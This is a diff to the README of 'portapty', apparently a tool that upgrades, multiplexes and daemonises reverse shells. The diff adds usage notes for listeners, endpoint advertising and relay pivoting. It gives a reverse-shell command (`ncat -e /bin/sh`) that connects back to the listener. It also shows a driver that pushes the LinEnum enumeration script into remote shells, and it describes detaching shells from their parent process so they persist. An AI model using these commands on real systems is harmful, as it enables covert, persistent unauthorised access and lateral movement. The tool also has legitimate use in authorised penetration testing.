@@ -1,8 +1,8 @@
 # portapty
 
 ## What?
-This is a portable pseudoterminal reverse shell upgrader and multiplexer
-### What?
+This is a portable pseudoterminal reverse shell upgrader and multiplexer with daemonisation
+### What???
 Portable: works on any linux version that can run this elf type (it's all statically linked and posix compliant)
 
 Pseudoterminal: you can Control-C without killing the shell
@@ -10,23 +10,24 @@ Pseudoterminal: you can Control-C without killing the shell
 Reverse shell: I haven't made it support bind shells yet
 
 Upgrader: When a normal shell connects to it and doesn't try to TLS handshake with it,
-it will be upgraded in a posix-compliant manner (this should even work on Linux from scratch boxes)
+it will be upgraded in a posix-compliant manner (this should even work on Linux from scratch boxes using `dash`)
 
-Multiplexer: multiple shells can connect at once
+Multiplexer: Multiple shells can connect at once
+
+Daemonisation: The upgraded reverse shells get completly detached from the parent process
 
 ## Usage
 ```
-portapty {client|server|keygen|relay|expose} OPTIONS
+portapty {client|server|keygen|relay} OPTIONS
 Options:
     client: [cert CERTHASH] to IP PORT [to IP PORT]...
     server: [cert CERTFILE] [key KEYFILE] [driver PATH] [cmd CMD] bind IP PORT [bind IP PORT]...;
     keygen: [cert CERTFILE] [key KEYFILE]
     relay:  bind IP PORT to IP PORT [bind|to IP PORT]...
-    expose: [cert CERTFILE] [key KEYFILE] bind IP PORT to IP PORT [{bind|to} IP PORT]...
 ```
 ### Server
-A simple invocation would be `portapty server eps :: 42069`. This hosts a server on port 42069 that will accept
-both standard reverse shells on all IPv4 and v6 addresses (dual to IPv6 dual stacking).
+A simple invocation would be `portapty server bind :: 42069`. This hosts a server on port 42069 that will accept
+both standard reverse shells on all IPv4 and v6 addresses (dual to IPv6 dual stacking) and portapty clients. 
 
 On connection (like by `ncat -e /bin/sh :: 42069`), you will see messages like:
 ```
@@ -34,10 +35,22 @@ On connection (like by `ncat -e /bin/sh :: 42069`), you will see messages like:
 ```
 If you run `screen /dev/pts/63` on this created pty, you will be able to interact with it fully, as if it were an ssh session.
 
+This will, however, tell standard reverse shells to connect to `[::]:42069`, which will only work on localhost. If you want to bind to a specific ip, you can try
+```
+portapty server bind 10.0.0.1 42069
+```
+Which, if you can bind to 10.0.0.1, will bind to just that v4 address, and tell all reverse shells to upgrade and connect to that endpoint.
+
+For more customisation, you can use the `advert` options, which will give a list of endpoints that clients can connect to
+```
+portapty server bind :: 42069 advert 10.0.0.1 31337
+```
+This will tell upgraded clients to reconnect to 10.0.0.1:31337 (but NOT `[::]:42069`).
+
 If you had a script you wished to run on the remote, you could try the folowing:
 
-```
-portapty server driver 'cat >&2&cat /tmp/LinEnum.sh;echo sleep 1;echo exit;wait' cmd bash eps :: 42069
+```sh
+portapty server driver 'cat >&2&cat /tmp/LinEnum.sh;echo sleep 1;echo exit;wait' cmd bash bind :: 42069
 ```
 
 This is good demonstration of the features provided to drivers. Let's break down the shell command argument for driver:
@@ -74,7 +87,7 @@ portapty server key portapty.key cert portapty.crt
 ### Relay and expose
 This is one of the cooler features of portapty. This acts as a simple TCP forwarder, and so allows pivoting with a central server:
 
-```bash
+```sh
 # Main server
 portapty server key portapty.key cert portapty.crt bind 10.0.0.1 42069
 # Pivot server
